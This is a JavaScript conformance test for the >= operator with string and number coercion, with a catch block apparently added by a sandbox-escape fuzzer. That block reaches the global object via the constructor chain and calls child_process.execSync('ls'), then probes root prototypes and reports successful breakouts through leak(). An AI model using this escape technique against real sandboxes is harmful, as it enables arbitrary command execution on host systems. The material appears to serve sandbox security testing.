try {
    if ('1' >= 1 !== true) {
        $ERROR('#1: "1" >= 1 === true');
    }
    if (1 >= '1' !== true) {
        $ERROR('#2: 1 >= "1" === true');
    }
    if (new String('1') >= 1 !== true) {
        $ERROR('#3: new String("1") >= 1 === true');
    }
    if (1 >= new String('1') !== true) {
        $ERROR('#4: 1 >= new String("1") === true');
    }
    if ('1' >= new Number(1) !== true) {
        $ERROR('#5: "1" >= new Number(1) === true');
    }
    if (new Number(1) >= '1' !== true) {
        $ERROR('#6: new Number(1) >= "1" === true');
    }
    if (new String('1') >= new Number(1) !== true) {
        $ERROR('#7: new String("1") >= new Number(1) === true');
    }
    if (new Number(1) >= new String('1') !== true) {
        $ERROR('#8: new Number(1) >= new String("1") === true');
    }
    if ('x' >= 1 !== false) {
        $ERROR('#9: "x" >= 1 === false');
    }
    if (1 >= 'x' !== false) {
        $ERROR('#10: 1 >= "x" === false');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}